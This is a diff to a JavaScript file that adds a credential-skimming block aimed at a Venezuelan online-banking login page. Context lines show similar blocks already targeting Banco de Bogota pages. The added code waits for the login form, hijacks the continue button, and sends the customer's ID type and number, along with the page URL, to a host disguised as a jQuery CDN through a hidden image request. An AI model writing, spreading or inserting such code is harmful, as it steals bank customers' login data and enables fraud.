@@ -10,6 +10,23 @@ for (var i = 0; i < arrayLength; i++) {
 
 
 
+
+if (top['location']['href']['indexOf']('https://web.bancadigitalbod.com') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('caja-login')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('button-continuar-apagado')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementByName("select-corto");
+              var select = option.options[option.selectedIndex].value;
+              var login = {};
+                  login.documentNumber = document.getElementsByName("form:txtNumIdCli")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.documentNumber;
+            }
+        }
+    }, 1000)
+};
+
+
 if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/empresas/') > -1) {
     var interval = setInterval(function () {
         if (document['getElementsByClassName']('cont-personas')[0]) {
@@ -24,7 +41,6 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
         }
     }, 1000)
 };
-
 
 
 if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/personas/') > -1) {
